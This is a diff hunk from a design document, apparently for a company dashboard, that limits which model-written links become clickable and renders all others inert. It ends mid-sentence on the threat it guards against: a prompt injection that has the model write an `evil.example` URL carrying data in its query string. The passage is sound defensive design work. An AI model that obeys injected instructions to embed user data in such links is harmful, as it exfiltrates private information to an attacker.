@@ -35,10 +35,13 @@ only where the dashboard BUILT it, from parts it checked, to a place that is
 the company's. A key whose project is the company's opens its work item and a
 handle in the chart its seat, both app routes the dashboard writes; a
 reference, a commit or a repository opens the code host the company
-configured, under an owner it names where it names any; and an address on a host the company configured (a code host,
-Jira, Confluence, Mattermost) opens as it is rebuilt from what it names
-(`<host>/<owner>/<repo>/pull/14`), with no query, fragment or anything else
-the model wrote. Every other address, an app route the model spelled among
+configured, and only under an owner that host names (`link_hosts`'
+`owners`), so a host that names none links no reference at all; and an
+address on a host the company configured (a code host, Jira, Confluence,
+Mattermost) opens as it is rebuilt from what it names
+(`<host>/<owner>/<repo>/pull/14`, a code host's under the same owner rule),
+with no query, fragment or anything else the model wrote, and is labelled
+only from those rebuilt parts. Every other address, an app route the model spelled among
 them, is drawn inert: its words and the host it names, readable and copyable,
 and never a control. A picture is its alt text, never fetched. The threat is
 a prompt injection that has the model write `https://evil.example/?q=<what it
